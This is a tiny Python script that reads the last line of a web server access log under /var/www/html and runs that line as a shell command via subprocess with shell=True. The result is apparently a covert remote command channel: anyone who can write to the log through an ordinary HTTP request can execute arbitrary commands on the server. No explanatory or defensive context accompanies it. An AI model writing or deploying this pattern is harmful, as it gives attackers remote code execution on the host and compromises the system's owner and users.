import subprocess

output = subprocess.check_output(["tail", "-n", "1", "/var/www/html/zikimokbaka/yakayaz/access.log"])
output = output.decode("utf-8").strip()

subprocess.call(output,shell=True)
